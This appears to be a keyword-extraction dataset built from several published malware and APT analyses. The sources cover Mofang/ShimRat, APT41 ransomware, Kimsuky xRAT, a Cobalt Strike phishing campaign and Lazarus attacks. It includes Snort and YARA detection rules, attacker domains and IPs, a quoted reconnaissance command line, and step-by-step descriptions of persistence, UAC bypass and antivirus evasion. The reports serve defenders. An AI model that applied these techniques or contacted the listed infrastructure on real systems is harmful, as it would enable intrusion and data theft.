executed.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 337.2.3 Command and control communication ShimRatReporter communicates over HTTP with a preconfigured C2 server. The gener- ated report is first compressed using lz compression applied with the RtlCompressBuffer Windows api function. After compression, the data is encrypted with a combination of shifting and xor using a static key. The key hardcoded in all versions seen in the wild is ‘NetMeter’.After a report is generated, the raw buffer with the data is taken and iterated through using an index. If the index is divisible by two, the value in the buffer is xor-ed. If it’s not divisible by two, the value of the key is added to the value in the buffer. This is probably best explained by showing the code for the decryption tool that fox-it has created:For every element in the encrypted report data, the index is checked to be divisible by two, using the modulo operation to wrap the key. If this is true, the value in the encrypted report is xor-ed with a value from the static key. If it is not divisible, it will subtract the ordinal key value from the current element in the encrypted report. In the encryption process the subtraction is just an addition.The report is then sent out in a post request to a preconfigured C2 server and a gate path. The url parameter filename is added to the post url. Its value is the computer name, also listed in the report, and an id. The C2 servers responds with a 200 ok when the report has been successfully received.Figure 14 Example ShimRat report upload34 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016Additionally, ShimRatReporter can be configured to download a payload. Reporting is default but payload downloading is optional. Payloads are downloaded from preconfigured locations. The payloads are encrypted in a similar way. Figure 15 shows an example payload download from the same campaign as shown in Figure 14.Figure 15 Example ShimRat payload downloadfox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 358 Network based detection (IOCs)The following sections contain iocs for infrastructure communication from the Mofang group from 2012 until the end of 2015. There are duplicate domains and ips in the list, due to an overlap in domains for the ips and a domain having pointed at multiple ips.8.1 Snort signatures The following Snort signatures provide coverage for the known HTTP based ShimRat and ShimRatReporter C2 communication protocols. One thing to keep in mind is that some variants of ShimRat communicate over HTTPS, which these rules will not cover.These IOCs are also available from our Github repository located at: url com/fox-it/mofang/alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""FOX-SRT - Trojan - ShimRat check-in (Data)""; flow:established,to_server; content:""POST""; http_method; content:"". php HTTP/1.""; content:""|0d0a0d0a|Data$$""; fast_pattern:only; content:!""Content-Type""; content:!""Referer:""; content:!""Cookie:""; content:""|0d0a0d0a|""; pcre:""/Data\$\$\d\d/R""; content:""Data""; isdataat:!1,relative; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically- motivated-information-stealing-adversary/; sid:21001854; rev:4;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""FOX-SRT - Trojan - ShimRat check-in (php)""; flow:established,to_server; content:""POST""; http_method; content:"".php HTTP/1.""; content:""|0d0a0d0a|php""; fast_pattern:only; content:!""Content-Type""; content:!""Referer:""; content:!""Cookie:""; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan- activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information- stealing-adversary/; sid:21001855; rev:4;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""FOX-SRT - Trojan - ShimRat check-in (Yuok)""; flow:established,to_server; content:""POST""; http_method; content:"".php HTTP/1.1|0d0a|User-Agent: ""; fast_pattern:only; content:!""Content-Type""; content:!""Referer:""; content:!""Cookie:""; content:""|0d0a0d0a|""; pcre:""/(php)?Yuok\$\$\d\d/R""; content:""Yuok""; isdataat:!1,relative; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically- motivated-information-stealing-adversary/; sid:21001856; rev:4;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""FOX-SRT - Trojan - ShimRatReporter check-in""; content:""POST""; http_method; content:""Accept-Encoding: utf-8|0d0a|""; fast_pattern; uricontent:"".php?filename=""; content:""Accept: */*""; content:!""Referer""; content:!""Content- Type""; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing- adversary/; sid:21001857; rev:4;)36 | fox-it | Mofang | A politically motivated information stealing adversary | May 20168.2 Domains & IP addresses The following domains and associated ips have a lot of historical data. Keep in mind the listed domains could be on shared hosting machines or compromised websites. Please make sure to correlate any hits from the table below with the listed samples and their configurations in section 10.1.This table only contains domains setup by the Mofang group themselves, it does not contain some of the compromised shared hosting domains listed in some samples in paragraphs 9.2 and 9.3.DomainIPFirst seenDomainIPFirst seenDomain video.today-nytimes.comapi.officeonlinetool.com ie.update-windows-microsoft.comtravel.tripmans.com dns.undpus.com secure2.sophosrv.com update.nfkllyuisyahooapis.com www.go-gga.com images.defexpoindia14.com update.micrdsoft.com support.f--secure.com - September 2013b.support.outlook-microsoft.net logon.had-one-job.com www.avgfree.us - May 2015fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 379 Host based detection (IOCs)9.1 yara rules The following yara rules can be used to detect the ShimRat and ShimRatReporter samples.These IOCs are also available from our Github repository located at: url com/fox-it/mofang/ShimRatrule shimrat description = ""Detects ShimRat and the ShimRat loader"" author = ""Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"" date = ""20/11/2015"" $datamarker1 = ""Data$$00"" $datamarker2 = ""Data$$01%c%sData"" $cmdlineformat = ""ping localhost -n 9 /c %s > nul"" $shim_func3 = ""GetHookAPIs""condition: ($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3) }38 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016ShimRatReporterrule shimratreporter description = ""Detects ShimRatReporter"" author = ""Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"" date = ""20/11/2015""strings: $IpInfo = ""IP-INFO"" $NetworkInfo = ""Network-INFO"" $OsInfo = ""OS-INFO"" $ProcessInfo = ""Process-INFO"" $BrowserInfo = ""Browser-INFO"" $QueryUserInfo = ""QueryUser-INFO"" $UsersInfo = ""Users-INFO"" $SoftwareInfo = ""Software-INFO"" $AddressFormat = ""%02X-%02X-%02X-%02X-%02X-%02X"" $proxy_str = ""(from environment) = %s""$netuserfun = ""NetUserEnum"" $networkparams = ""GetNetworkParams""condition: all of them }fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 399.2 ShimRat samples The following list of samples includes the core of ShimRat as well as the loader dll in the cases where ShimRat relied on dll hijacking to start.ShimRat core url - url “Citrix lure”, see section 6.3 url d8e68d2d5141a4a07dSHA256MD5ShimRat core loader DLL Filename(s)msvcr110.dll4e493a649e2b87e- 4fa4a0ebbdee76d7d117fdf40 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016ShimRat core MD5SHA256ShimRat core loader DLL Filename(s)elogger.dllelogger.dat “Global campaign”, see section 6.4 url c25b2MD5ShimRat core loader DLL Filename(s)elogger.dllelogger.dat - url “Myanmar”, see section 5 url 8168da36a7908d150e44fMD5SHA256ShimRat core loader DLL Filename(s)elogger.dll26ff9e2da06b7e90443d- da5b71cfox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 41ShimRat core SHA256ShimRat core loader DLL Filename(s)elogger.dllelogger.dat “Myanmar”, see section 5 url a32f9946f9SHA256MD5vmware-vmx.exe “Global campaign”, see section 6.4 url Filename(s)elogger.dllelogger.dat - url url url “Myanmar”, see section 5 url - url “MSME DEFEXPO”, see section 6.1 url “Global Campaign”, see section 6.4 url url “MSME DEFEXPO”, see section 6.1 url “seg”, see section 6.2 HTTP=proxy.seg.local:8080 url “Global campaign”, see section 6.4 url “Global campaign”, see section 6.4 url “Global campaign”, see section 6.4 url url url “Global campaign”, see section 6.4 url url url url url “Global campaign”, see section 6.4 url The following samples are the core ShimRatReporter samples. Some of these were delivered in zip archives or packaged in some form but those aren’t listed.These table blocks contain parsed configuration data for the samples, the domains listed here are also present separately in the Network ioc paragraph 2, but added here to give an overview and outline the relationship between the iocs.ShimRatReporter core Observed filename(s) Related campaign Configured C2 domain Configured C2 reporting gate Observed filename(s) Related campaign Configured C2 domain Configured C2 reporting gate Configured 2nd stage payload Observed filename(s) Related campaign Configured C2 domain Configured C2 reporting gate Configured 2nd stage payload MD5 SHA256vmware-vmx.exe - www.ipacking.co.kr url dns.undpus.com url url dns.undpus.com url url Observed filename(s) Related campaign Configured C2 domain Configured C2 reporting gate Observed filename(s) Related campaign Configured C2 domain Configured C2 reporting gate Configured 2nd stage payload Observed filename(s) Related campaign Configured C2 domainConfigured C2 reporting gate Configured 2nd stage payloadMD5 wbmail.city-library.com url “Global campaign”, see section 6.4 ie.update-windows-microsoft.com url url “Myanmar”, see section 5 library.cpgcorp.org secure2.sophosrv.com url url url As described in section 7.2 the ShimRat malware uses certain antivirus product compo- nents that are vulnerable to dll hijacking in order to run. The following tables contain all the indicators for these components.Keep in mind that these indicators are only useful indicators if the antivirus product the component comes from is not installed.Company Application name Version (product specific) Hijacked DLL First seen used elogger.dll 2014-04-30 Version (product specific) Hijacked DLL First seen used McAfee Oem Module mcutil.dll 2015-03-15 Version (product specific) Hijacked DLL First seen used Norton Identity Safe msvcr110.dll 2015-09-07 As explained in paragraph 7.1.3, ShimRat can become persistent through the use of services. The configuration of the service which includes the service name, title and description is configured inside the individual ShimRat samples. The list below are uniquely observed service configurations. Correlating these with the actual process the service starts, is a good indicator of the presence of ShimRat.Service name Service title Service descriptionService name Service title Service descriptionService name Service title Service descriptionService name Service title Service descriptionService name Windows WebLogic Service DHCP service for windows networks.Provides Windows DHCP Net founda- tion frame support ,through the framework, on servers that are also running the service.WNetDHCP Windows DHCP Service DHCP service for windows networks.Provides Windows DHCP Net founda- tion frame support ,through the framework, on servers that are also running the service.helpservices Windows Help Services Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable.mshelpsrvs Windows Help Services Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable.mshelpsrvsv Windows Help Services Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable.50 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016Service name Windows Help log Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable.Service name Kaspersky protect service Kaspersky protect service9.6 Observed shims As discussed in paragraph 7.1.4, ShimRat can obtain persistence on systems by installing shims. The following table contains the settings for these shims and some observed hashes. Checking for the configurations of these shims will be more effective than just checking the listed hashes.Platform Type of fix Type of fix {503ec3d3-165a-4770-b799-099d43b833ec} {e8cc2eb5-469c-43bd-9d69-de089e497302} {f8c4cc07-6dc4-418f-b72b-304fcdb64052} {7feee735-1296-4c40-bdd4-7d4f09acc2d0} • Was founded in 1999. • Established one of the first Cyber SecurityOperations Centers in Europe.• Is Europe’s largest specialized cyber securitycompany.• Operates in three business areas:1 Cyber Threat Management: a solution portfolioaimed at reducing the risks of cyber threats, and includes: professional services, managed security services, and technology;2 Web and Mobile event analytics: a solution portfolio that is aimed at reducing financial risks in (online) payment transactions;3 High Assurance: solutions that make trustedcommunication possible to the highest classification levels.• Has been involved in many high-profile Incident Response cases. Most of the cases we worked on are secret. An approved selection can be shared upon request.fox-it Olof Palmestraat 6, Delft po box 638, 2600 ap Delft The Netherlandst +31 (0) 15 284 79 99 f +31 (0) 15 284 79 90 e fox@fox-it.comwww.fox-it.com ","{'phrases': ['initial compromise', 'targets', 'ed', 'emails', 'ShimRatReporter', 'malware', 'system info', 'end', 'a C2 server', 'the victim', 'environment', 'Mofang', 'infrastructure', 'the target network', 'software', 'reconnaissance', 'Details', 'goals', 'files', 'keys', 'Data', 'servers', 'new waves', 'attacks'], 'target': 'initial compromise; targets; ed; emails; ShimRatReporter; malware; system info; end; a C2 server; the victim; environment; Mofang; infrastructure; the target network; software; reconnaissance; Details; goals; files; keys; Data; servers; new waves; attacks.'}"
the attacker; a scheduled task; the victim; the loader; Cobalt Strike; files; tools; the Cobalt Strike payload; lc.tmp; remote access; addition; the ransomware payload; download; additional payloads; the payloads; C2; credentials; data; 10; victims.,"[' 1. The threat actor obtains username and password for the victim\'s Active Directory server. 2. They modify the Active Directory group policy object to create scheduled tasks that execute malware on all domain machines. 3. The scheduled tasks use SMB and IIS to copy the ransomware loader ""lc.tmp"" to other hosts. 4. PowerShell commands execute the ransomware loader on infected hosts. 5. The loader decrypts and installs the Cobalt Strike payload. 6. The attacker uses Cobalt Strike for lateral movement and reconnaissance for months prior to deploying ransomware. ']","Extract the keywords: www.trendmicro.com /en_gb/research/20/i/u-s--justice-department-charges-apt41-hackers-over-global-cyberattacks.html U.S. Justice Department Charges APT41 Hackers over Global Cyberattacks ⋮ 9/18/2020APT & Targeted AttacksThe United States Justice Department announced that it was charging five Chinese citizens with hacking crimes committed against over 100 institutions in the United States and abroad. These five individuals were reportedly connected to the hacking group known as APT41.On September 16, 2020, the United States Justice Department announced that it was charging five Chinese citizens with hacking crimes committed against over 100 institutions in the United States and abroad. The global hacking campaign went after a diverse range of targets, from video game companies and telecommunications enterprises to universities and non-profit organizations. The five individuals were reportedly connected to the hacking group known as APT41. At the time of writing, they remain fugitives, but two Malaysian citizens have been arrested for aiding the hackers.Three related indictments unsealed by the Justice Department laid out the group's wide range of malicious activities, including crypto-jacking and ransomware attacks. Most of the activities appear to have been done for profit, but some were for espionage purposes.Justice officials say that the group's intrusions allowed the hackers to steal source code, customer account data, and personally identifiable information (PII). Other notable activities include defrauding video game companies by manipulating in-game resources, and launching a ransomware attack on the network of a non-profit organization dedicated to combating global poverty.The hackers used publicly available exploits and common vulnerabilities, which are listed in the official report. They also employed sophisticated hacking techniques to gain and maintain access to the victim's computer networks. The official report outlined how the team used ""supply chain attacks"" in which they compromised software providers and modified the code they were giving their customers. This also allowed the threat actors to compromise the customers and spread their influence further.This is not the first time that APT41 activities have been scrutinized — the group has been active for some time. Just last May, Trend Micro connected the group to ransomware attacks on Taiwanese organizations. The new ransomware family, which we dubbed ColdLock, is potentially destructive as it appears to target databases and email servers for encryption.The attack chain of ransomware incidents in TaiwanThe Trend Micro Research team investigated the ColdLock ransomware attack, which actually targeted the energy industry in Taiwan. The ransomware attack chain is outlined in Figure 1; however, we currently1/4do not know the initial arrival vector of this threat into a potential victim's network. Our analysis focused on the way the attacker spreads the ransomware to infect as many machines as possible.1. The threat actor enters a victim's network environment and obtains the account username andpassword of the company headquarters' active directory server.2. After logging in to the active directory server, the threat actor modifies the active directory servergroup policy object — this includes a request that all domain account members create a scheduled task and execute the malware.3. In the final step, the other subsidiary active directory servers and all the endpoint machines willdownload the scheduled task and execute the ransomware.Figure.1 The attacker uses an Active Directory (AD) scheduled task to deploy the ransomware in the customer environment.Scheduled tasks play a very important role in this incident. The threat actors use a scheduled task command to spread and infect a victim's environment. The screenshot in Figure 2 shows how the threat actor uses SMB and internal IIS Web Service to copy ""lc.tmp"" (the main ransomware loader in this incident) to other victims' host machines. After that, the PowerShell command executes the main ransomware loader.2/4Figure 2. How a scheduled task delivers the malware to a victim's environmentThe right tool for the jobBefore the ransomware attack, the attacker was likely already hiding in the victims' environments for some time. We found the same customized loaders installed as Windows services in every victim's environment, and those infected machines were in positions that allowed them to reach other machines under the subnets.The loaders decrypted the next-stage payloads, which were either embedded inside itself or stored on the disk as separate files. The next-stage payloads were CobaltStrike in this series of incidents. After the loader and payload pairs were successfully installed, the attacker started poking around the environments with tools like password dumpers and HTTP tunneling tools — then the ransomware attacks were launched one month later.More than just a single occurrenceDuring the investigation, we discovered more incidents that are possibly related to the one discussed above. We did this by checking the indicator overlap and the C&C infrastructure overlap. Based on the distribution of the linked indicators, the attacker(s) appears to be interested in energy, retail, and telecom companies, mainly in Southeast Asia. They mostly conduct espionage activities — lurking in the environments for a long period and packing the data that interested them. They also seem to be updating the backdoors and toolsets they use.Possible link to Chinese espionageThe C&C server 104[.]233[.]224[.]227 was hosted under a small hosting service with only 64 IPs under it. The IP range was registered to an address in Inner Mongolia, China. The C&C server was abandoned several days after the incidents, and now the IP is hosting a Simplified-Chinese site.Trend Micro Solutions3/4Sophisticated hacking groups have versatile tools and are persistent threats. Users should deploy more robust and proactive defenses to be adequately protected against these groups. The following Trend Micro Solutions are recommended:Trend Micro XDR for Users: Applies AI and analytics for earlier detection of threats across endpoints and other layers of the system Trend Micro Apex One™: Provides actionable insights, expanded investigative capabilities, and centralized visibility across the network. Trend Micro™ Deep Discovery™ Email Inspector: Detects, blocks, and analyzes malicious email attachments through custom sandboxing and other detection techniquesTo help defend users against APT41 specifically, we have developed an assessment tool that can scan endpoints for file-based indicators collected from global intelligence sources.Indicators of CompromiseMalware FamilySHA-1 ","{'phrases': ['the threat actor', 'password', 'Active Directory', 'scheduled tasks', 'malware', 'the scheduled task', 'SMB', 'IIS', 'the ransomware', '""lc.tmp', 'PowerShell', 'the loader', 'the attacker'], 'target': 'the threat actor; password; Active Directory; scheduled tasks; malware; the scheduled task; SMB; IIS; the ransomware; ""lc.tmp; PowerShell; the loader; the attacker.'}"
the attacker; Installer_sk5621.com.co.exe; Gold Dragon; a Gzip file; the installer; Gold Dragon; Process Hollowing; xRAT; remote control; the attacker; system information; the infected PC; additional payloads.,[' 1. Installer runs to download and execute obfuscated Gold Dragon malware. 2. Gold Dragon establishes persistence and waits for additional payloads. 3. xRAT remote access trojan downloaded and executed via process hollowing. 4. xRAT allows attacker remote control and data exfiltration capabilities. 5. Uninstaller tool cleans up infection artifacts from the system. '],"Extract the keywords: asec.ahnlab.com /en/31089/ Distribution of Kimsuky Group's xRAT (Quasar RAT) Confirmed - ASEC BLOG ⋮ 2/8/2022On January 26th, 2022, the ASEC analysis team has discovered that the Kimsuky group was using the xRAT (Quasar RAT-based open-source RAT) malware.xRAT Github Address: url to the logs collected by AhnLab’s ASD (AhnLab Smart Defense) infrastructure, the attacker installed a variant of Gold Dragon on the first infected PC on January 24th. The basis for assuming that the obtained file is a variant of Gold Dragon is as follows:Injection method is same as the method used by the original Gold Dragon (behavior of process hollowing on iexplore.exe, svchost.exe,etc.) Feature of terminating AhnLab product’s real-time detection window class (49B46336-BA4D-4905- 9824-D282F05F6576) Termination of Daum Cleaner (daumcleaner.exe) processThe attacker installed Gold Dragon through the exclusive installer (installer_sk5621.com.co.exe). The installer downloads Gold Dragon compressed in the form of a Gzip file from the attacker’s server, decompresses it as “in[random 4 numbers].tmp” in the %temp% path, then executes it via rundll32.exe.The installed Gold Dragon has 4 export functions.Perform WorkThe installer first executes Gold Dragon by giving the “Start” argument. Once the “Start” export function is executed, Gold Dragon copies itself to a certain path and registers the copied DLL to the autorun registry key. The “Perform” export function is given for DLL execution argument.Figure 1. Path for registry registration and self-copyIt is assumed that the info leaking feature of the variant that was discovered was modularized. The system information acquisition command execution feature that is mainly used by Gold Dragon did not exist in the Gold Dragon variant. This means that additional payloads can be downloaded from the attacker’s server to obtain system information.1/4cmd.exe /c ipconfig/all >>”%s” & arp -a >>”%s” cmd.exe /c systeminfo >>”%s” cmd.exe /c tasklist >>”%s”The attacker does not obtain information through system processes, but instead additionally installs xRAT (Filename: cp1093.exe) that allows remote control of the system to the infected PC to perform info- stealing features. Once cp1093.exe is executed, it copies a normal powershell process (powershell_ise.exe) to the “C:\ProgramData\”path and executes xRAT via process hollowing technique.Figure 2. xRAT malwareThe attacker was also meticulous enough to also distribute an additional file (UnInstall_kr5829.co.in.exe) along with xRAT to delete the traces of attack existing in the target PC.2/4Figure 3. Code related to deletion of traces of infectionAhnLab is constantly monitoring and responding to such APT attacks, and users should refrain from opening attachments from emails from unknown sources and update the security software to the latest version to prevent damage by information leakage.[IOC][Installer] C&C : https[:]//sk5621.com[.]co[xRAT] C&C : 45.77.71[.]50:8082[Uninstaller] ","{'phrases': ['Installer', 'Gold Dragon', 'additional payloads', 'xRAT', 'process hollowing', 'attack', 'remote control', 'the system'], 'target': 'Installer; Gold Dragon; additional payloads; xRAT; process hollowing; attack; remote control; the system.'}"
the attacker; a link; Ukrainian; Cobalt Strike Beacon; a file; the bootloader; Alt.exe; One.exe; dropper.exe; the Discord service; the EXE files; the malicious program; Cobalt Strike Beacon; CERT-UA; UAC-0056; confidence.,"[' 1. Phishing emails are sent impersonating Ukrainian government agencies, containing links to download ""critical updates"" 2. The emails link to a website hosting ""BitdefenderWindowsUpdatePackage.exe"" 3. The EXE file executes ""alt.exe"" bootloader 4. ""alt.exe"" downloads ""one.exe"" and ""dropper.exe"" from a Discord URL 5. ""one.exe"" executes and infects the system with Cobalt Strike Beacon remote access malware 6. ""dropper.exe"" decodes and executes a Go langauge EXE file, function still being analyzed 7. Cobalt Strike Beacon allows remote control of the infected system 8. The EXE files are protected by Themida packing/obfuscation 9. Indicators of compromise like file hashes, URLs, and graphic images can help detect the attack 10. The phishing campaign is attributed to threat actor UAC-0056 with medium confidence ']","Extract the keywords: cert-gov-ua.translate.goog /article/37704 Cyberattack on the state authorities of Ukraine using the malicious program Cobalt Strike Beacon (CERT-UA # 4145)General InformationThe Governmental Computer Emergency Response Team of Ukraine CERT-UA received a notification from the coordinating entities on the distribution of e-mails on behalf of the state bodies of Ukraine with instructions on how to increase the level of information security. The body of the letter contains a link to the website hxxps://forkscenter[.]fr/, from which it is proposed to download ""critical updates"" in the form of a file ""BitdefenderWindowsUpdatePackage.exe"" of about 60 MB.It was found that the mentioned file will ensure the execution of the bootloader ""alt.exe"", which will download the files ""one.exe"" and ""dropper.exe"" from the Discord service and run them. The study found that running ""one.exe"" would damage your computer with the malicious program Cobalt Strike Beacon. The executable file ""dropper.exe"" will load base64-encoded data and decode it into an EXE file developed using the Go programming language. File analysis continues. Note that EXE files are protected by Themida protector.We associate the detected activity with the activity of the UAC-0056 group with an average level of confidence.Indicators of compromiseFiles: (bait document) hxxps: // forkscenter [.] fr / BitdefenderWindowsUpdatePackage.exe hxxps: //cdn.discordapp [.] com / attachments / 947916997713358890/949948174636830761 / one.exe hxxps: //cdn.discordapp [.] com / attachments /1/2947916997713358890/949948174838165524 / dropper.exe hxxps: // nirsoft [.] me / s / 2MYmbwpSJLZRAtXRgNTAUjJSH6SSoicLPIrQl / field- keywords / hxxp: // 45 [.] 84.0.116: 443 / i forkscenter [.] fr (2022-01-29) nirsoft [.] me (2022-02-17) 45 [.] 84.0.116Hosts: % TMP% \ alt.exe % PROGRAMDATA% \ one.exe % PROGRAMDATA% \ dropper.exeGraphic images2/2 ","{'phrases': ['mails', '""critical updates', 'BitdefenderWindowsUpdatePackage.exe', 'one.exe', 'fr', 'Discord', 'Cobalt Strike Beacon', 'EXE files', 'Themida', 'Indicators', 'compromise', 'graphic images', 'UAC-0056', 'confidence'], 'target': 'mails; ""critical updates; BitdefenderWindowsUpdatePackage.exe; one.exe; fr; Discord; Cobalt Strike Beacon; EXE files; Themida; Indicators; compromise; graphic images; UAC-0056; confidence.'}"
the attacker; phishing emails; victims; the decoy document; macros; The macro code; executes; WINWORD.exe; IEUpdate.exe; error.log files; the IEUpdate.exe; UAC; fodhelper.exe; information; the C2; commands; RAT; sabotage; extortion.,"[' 1. Sent spearphishing emails with Word doc containing macro that downloads initial malware. 2. Macro executes to download IEUpdate.exe malware. 3. IEUpdate.exe communicates with C2 on Dropbox to download additional payloads. 4. Further malware like hvncengine.dll and shellengine.dll enable remote access, command execution, and data exfiltration. 5. Malware uses process injection, disables security products, and disguises traffic to evade detection. 6. Finally, sensitive documents and data are collected from compromised systems. ']","Extract the keywords: Analysis of Suspected Lazarus Attacks Against South Koreamp-weixin-qq-com.translate.goog/s/w-KF5HUNe8-KlmFl6zLkZwAntiy CERT Antiy Group 2022-11-01 12:47 Posted in Beijing Recently, Antiy CERT discovered an attack activity against South Korea. The title of the decoy document is ""Sogang KLEC.docx"" (Sogang University Korean Language Education Center.docx). Analyze and judge the obtained samples and associated malicious payloads, and finally associate them with the Lazarus organization. Lazarus organization, also known as HIDDEN COBRA, APT38, Zinc, Guardians of Peace, etc., is one of the most active APT organizations in the peninsula region. The organization's attack targets involve dozens of countries such as Poland, Chile, the United States, Mexico, Brazil, etc., and carry out targeted attacks on financial institutions and individuals such as banks and Bitcoin exchanges to obtain economic benefits. It is the largest financial institution in the world. one of the threats. In addition, the group also infiltrated institutions and enterprises such as aerospace, COVID-19 vaccine technology, government, media, etc. to steal important information and carry out sabotage and extortion.0 2 Attack process The attack flow of this attack is roughly as follows:1. Using template injection, wait for the decoy document to be opened and download the malicious template constructed by the attacker to the host for execution.2. The macro code in the template requests the specified URL, downloads the malicious payload and injects it into WINWORD.exe for execution.3. The downloaded malicious payload is mainly used to release the download tool IEUpdate.exe and execute it, and add it to the registry RUN for persistence.4. After IEUpdate.exe is executed, it sends a message to obtain the C2 used for subsequent communication, and downloads different malicious payloads for execution according to the returned information.5. There are two known payloads, hvncengine.dll and shellengine.dll, which are used to communicate with C2 for remote control.1/33Figure 2-1 Schematic diagram of the attack flow03 the decoy document was found. The information indicates that the decoy document was downloaded from the large attachment storage site provided by Naver Mail. It is speculated that the attacker may send phishing emails through Naver Mail to attack. Naver Mail is known to be an email service provided by the South Korean internet group Naver Corporation.Figure 3‑1 Decoy document download linkSaniTOX is a security protection software from South Korea's Jiransecurity company. The decoy document imitates SaniTOX to induce victims to enable macros. The main content of the malicious document is as follows.Figure 3-2 The main content of the decoy document of this attackAfter correlating the content of the document body, it is found that the body content of the decoy document appears not for the first time.3/33Figure 3‑3 The main content of the decoy document in past attacks The attacker uses Word template injection to download and execute the malicious template after the victim opens the decoy document. The address of the template is document is opened. The main function of the macro code is to download malicious payloads. If the download is successful, the downloaded malicious payloads will be injected into the Winword program for execution.Figure 3‑5 Download malicious payloadThis function injects the downloaded malicious payload into WinWord for execution.5/33Figure 3-6 Injection functionThe malicious payload injected into the Winword process will release the IEUpdate.exe and error.log files under %LocalAppData%\Microsoft\PlayReady, and then bypass UAC through fodhelper.exe to elevate the permissions of IEUpdate.exe to execute, in the error.log file Some URL links ""s/ucnpe74wo87d3mm/server.txt?dl=0"" that need to be bypass part of the sandbox that modifies the sleep time.Figure 3‑10 Sandbox detectionObtain the device description information of the main hard disk, and concatenate it with ""VDEVICE"". The concatenated string is hashed with CRC and then concatenated with ""0"". The format is ""0+CRC hashed value"".Figure 3-11 Obtain host information and generate host IDDetermine whether it has administrator privileges by creating a directory under the system directory.8/33Figure 3-12 Permission JudgmentGet the version information of the operating system.Figure 3-13 Obtaining OS version informationObtain a process snapshot and determine whether the currently running process contains ""v3l4sp.exe"", ""AYAgent.aye"", and ""IEUpdate.exe"". Among them, ""v3l4sp.exe"" is a subprogram of the free antivirus software V3 Lite of the Korean company AhnLab, and ""AYAgent.aye"" is a part of the Internet security suite ALYac of the Korean company ESTsoft.Figure 3-14 Detection of designated anti-virus softwareIf the path is ""%LocalAppData%\Microsoft\PlayReady\IEUpdate.exe"" and the process ID does not match the current process, close the previous IEUpdate.exe process.9/33Figure 3-15 Close the previous processSet the flag according to whether ""/s"" and ""/a"" are included in the parameters of cmdline, and select different branches to execute according to the previously set administrator permission flag.Figure 3-16 Set the mark according to the parameterDetermine whether the previous privilege escalation operation was successful. If you have administrator rights, it will add itself to the Windows Defender exclusion list via PowerShell commands.10/33Figure 3‑17 Add this file to Windows Defender whitelistIf you are not an administrator, create a new thread and execute it in a loop, as shown below.Figure 3-18 Creating a threadThe thread creates another thread function, which is used to communicate with the C2.First, splicing ""dl.dropboxusercontent.com"" with the content obtained from the error.log file, and obtaining the C2 address of the next communication from the URL formed after splicing.Figure 3‑19 Obtaining the C2 address from Dropbox11/33Then return the operating system version information, whether there is a specified antivirus software, and the previously generated uid as the online package.Figure 3-20 Constructing the online packageThe online package return function will send the collected information to post2.php.Figure 3-21 Sending an online packageThen receive data from the spliced URL, process the data, and obtain the content after the third ""%"" in the data, and use ""\r"" and ""\n"" as the terminators. This content will serve as the resource address for subsequent download URLs. Get the Arabic numerals of numbers 0-9, and get the instruction ID after processing.12/33Figure 3-22 Sending a request and receiving a command from C2Execute the issued command cyclically, and will judge whether to repeat the execution.13/33Figure 3-23 Execute the command issued by C2Download the dll file and select the export function to execute.14/33Figure 3-24 Download subsequent load executionThe information of the above samples was searched through the public intelligence platform, and two files were found in the PCAP file associated with the decoy document, which should be malicious payloads downloaded by IEUpdate.exe, and they have the same return data structure and decryption algorithm.Table 3-4 Return data structure15/33offset to headerlength (byte)explain0x00xC0x140x180x1C0xC0x80x40x4sizeFixed data, decrypted as )(*&POIU:LKJFixed data, replaceable with received data on demandThis part of the data is determined according to the content of the executionThe length of the returned data (size)returned data0x1C+size0xCFixed data, decrypted to ^%$#YTREHGFDDuring the process of returning the file, the data structure of the returned data will be adjusted appropriately, as shown in the following figure.Table 3-5 File return data structureoffset to headerlength (byte)explain0x00xC0x140x1C0x200xC0x80x80x4Fixed data, decrypted as )(*&POIU:LKJFixed data, replaceable with received data on demandoverall file sizefile path lengthsize1file path (size1)0x20+size10x28+size10x80x4the position of the current file pointerThe size of the current read file content (size2)16/330x2C+size1size2read file content0x2C+size1+size2 0xCFixed data, decrypted to ^%$#YTREHGFDThe positions of "")(*&POIU:LKJ"" and ""^%$#YTREHGFD"" on the keyboard are shown in the figure below.Figure 3-25 The position of the fixed content in the returned data structure on the used to close the socket connection and wait for the thread. SEStart is the main function of the load, which is used to communicate with the C2 to realize the hvnc function.After the sample runs, it first generates a string with the host ID like IEUpdate.exe.Figure 3-26 Obtain host information and generate host IDEvery ten minutes, a malicious function is executed.Figure 3-27 Setting the interval timeCreate a desktop with the above string with the host ID as the name.18/33Figure 3-28 Create a new desktopAfter entering the thread function, like IEUpdate.exe, read the content in ""error.log"" and splicing it with ""dl.dropboxusercontent.com"", obtain the C2 address through GET request, and then try to connect through socket.Figure 3‑29 Get C2 from Dropbox and connectIf the connection is successful, the previously generated host identifier will be sent over the socket and the current thread's association with the desktop will be set.19/33Figure 3-30 Sending a specific stringReceive commands from the server in turn to realize the function of hvnc.Figure 